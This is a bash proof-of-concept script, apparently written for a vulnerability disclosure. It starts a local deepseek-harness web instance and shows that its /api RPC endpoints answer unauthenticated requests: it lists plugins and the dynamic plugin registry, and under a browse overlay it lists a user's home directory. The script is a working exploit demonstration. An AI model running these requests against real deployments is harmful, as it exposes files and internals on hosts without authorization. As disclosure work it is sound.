#!/usr/bin/env bash
# =============================================================================
# Real-instance PoC — Unauthenticated Typert Remote surface on /api (G-4/LAN)
#
# deepseek-harness rc.5 @ 47f943859b
#
# 默认 web profile 就挂载 typert-gateway + api-remotes + cordis-host-runner +
# plugin-inventory。Typert Gateway 拦截 /api RPC (authority: trusted-host),
# 而 isTrustedApiRequest 只要求 Host=loopback/trustedHosts, 无 Origin 也放行:
#   -> 任何本机进程(默认部署)或 LAN 对端(0.0.0.0 配置, resolveLanTrust 自动
#      把本机 LAN IPv4 加入 trustedHosts)都能无鉴权调用这些 Remote 端点。
#
# 本脚本验证(全部默认挂载, 无需 API key / LLM):
#   1. pluginInventory/list          -> Loader 插件清单(模块名/状态)
#   2. dynamicCordisRunner/inventory -> 动态插件注册表(含 activeRun)
#   3. host.listDirectory            -> 仅 browse 能力可用(headless 部署);
#                                      用 browse overlay 演示任意目录列举
#
# 用法: bash ../dsh-security-pocs/poc-v3b-typert-unauthenticated-surface.sh
# =============================================================================
set -euo pipefail
SELF="$(cd "$(dirname "$0")" && pwd)"
REPO=${REPO:-}
if [ -z "$REPO" ] && [ -d "$SELF/../deepseek-harness" ]; then
  REPO=$(cd "$SELF/../deepseek-harness" && pwd)
fi
REPO=${REPO:-$(cd "$SELF/.." && pwd)}
[ -f "$REPO/apps/cli/src/bin.ts" ] || { echo "REPO=$REPO is not a deepseek-harness checkout (missing apps/cli/src/bin.ts); set REPO=/path/to/deepseek-harness" >&2; exit 2; }
WEB_PORT=${WEB_PORT:-3080}
TS=$(date +%Y%m%d-%H%M%S)
E="$SELF/evidence"
mkdir -p "$E"
OUT="$E/08-remote-surface-${TS}"
mkdir -p "$OUT"
WEB_LOG="/tmp/dsh-web-08-${TS}.log"
BROWSE_OVERLAY="$OUT/browse-overlay.yml"
uuid() { node -e 'console.log(crypto.randomUUID())'; }
rpc() { # rpc <method> <payload-json>
  curl -s -m 10 -X POST "http://127.0.0.1:$WEB_PORT/api/$1" -H 'content-type: application/json' \
    -d "{\"type\":\"client-request\",\"rpcId\":\"$(uuid)\",\"method\":\"$1\",\"payload\":$2}"
}

say() { printf '\n\033[1;36m◆ %s\033[0m %s\n' "$1" "$2"; }
ok()  { printf '\033[1;32m  ✔ %s\033[0m\n' "$*"; }

kill_web() { [ -n "${WEB_PID:-}" ] && kill "$WEB_PID" 2>/dev/null || true; }
cleanup() { kill_web; }
trap cleanup EXIT

echo "======================================================================"
echo "  UNAUTHENTICATED TYPERT REMOTE SURFACE (/api) — real instance"
echo "  target: deepseek-harness rc.5 @ 47f943859b   ts=$TS"
echo "======================================================================"

say SETUP "dsh web (默认 profile, loopback)"
(cd "$REPO" && exec node --import tsx/esm apps/cli/src/bin.ts web --port "$WEB_PORT") >"$WEB_LOG" 2>&1 &
WEB_PID=$!
for i in $(seq 1 60); do
  curl -s -m 1 -o /dev/null -X POST "http://127.0.0.1:$WEB_PORT/api/host.describe" \
    -H 'content-type: application/json' \
    -d '{"type":"client-request","rpcId":"w","method":"host.describe","payload":{}}' && break
  sleep 1
done
sleep 2

say RPC1 "pluginInventory/list — Loader 插件清单(无鉴权)"
R1=$(rpc "pluginInventory/list" '{"args":{}}')
echo "$R1" > "$OUT/01-pluginInventory-list.json"
R1_ENTRIES=$(echo "$R1" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.parse(s).result.value.entries.length)}catch{console.log("ERR")}})')
ok "entries=$R1_ENTRIES"
if ! [[ "$R1_ENTRIES" =~ ^[0-9]+$ ]] || [ "$R1_ENTRIES" -eq 0 ]; then
  echo "FAIL: pluginInventory/list unreachable or empty (see $WEB_LOG $OUT/01-pluginInventory-list.json)"; exit 1
fi
echo "$R1" | head -c 400; echo

say RPC2 "dynamicCordisRunner/inventory — 动态插件注册表(无鉴权, 含 activeRun/pluginId)"
R2=$(rpc "dynamicCordisRunner/inventory" '{"args":{}}')
echo "$R2" > "$OUT/02-dynamicCordisRunner-inventory.json"
R2_OK=$(echo "$R2" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.parse(s).result.ok)}catch{console.log("ERR")}})')
ok "endpoint reachable, result.ok=$R2_OK"
if [ "$R2_OK" != "true" ]; then
  echo "FAIL: dynamicCordisRunner/inventory unreachable (see $WEB_LOG $OUT/02-dynamicCordisRunner-inventory.json)"; exit 1
fi
echo "$R2" | head -c 300; echo

say RPC3 "host.listDirectory(/) — 当前解析为 native, 不可用(记录默认形态)"
R3=$(rpc "host.listDirectory" '{"path":"/"}')
echo "$R3" > "$OUT/03-host-listDirectory-native.json"
echo "$R3" | head -c 300; echo

say BROWSE "headless 部署形态: 用 browse overlay 覆盖 directory-picker"
cat > "$BROWSE_OVERLAY" <<'YML'
- id: directory-picker
  disabled: true
- insert:
    - id: directory-picker-browse
      name: '@deepseek-ai/dsh-host-directory-picker-browse'
YML
kill_web
sleep 1
(cd "$REPO" && exec node --import tsx/esm apps/cli/src/bin.ts web --patch "$BROWSE_OVERLAY" --port "$WEB_PORT") >>"$WEB_LOG" 2>&1 &
WEB_PID=$!
for i in $(seq 1 60); do
  curl -s -m 1 -o /dev/null -X POST "http://127.0.0.1:$WEB_PORT/api/host.describe" \
    -H 'content-type: application/json' \
    -d '{"type":"client-request","rpcId":"w","method":"host.describe","payload":{}}' && break
  sleep 1
done
sleep 2
R4=$(rpc "host.listDirectory" '{"path":"/Users/lihao"}')
echo "$R4" > "$OUT/04-host-listDirectory-browse.json"
if echo "$R4" | rg -q '"ok":true'; then
  ok "browse 能力下 host.listDirectory 无鉴权返回目录列表:"
  echo "$R4" | node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{const j=JSON.parse(s);const rows=j.result.value.entries||[];console.log("  entries:",rows.length,"| first:",JSON.stringify(rows[0]??null))})'
else
  echo "FAIL: host.listDirectory denied under browse capability (see $WEB_LOG $OUT/04-host-listDirectory-browse.json)"
  echo "$R4" | head -c 300; echo; exit 1
fi

echo
echo "evidence: $OUT"
echo "web log:  $WEB_LOG"
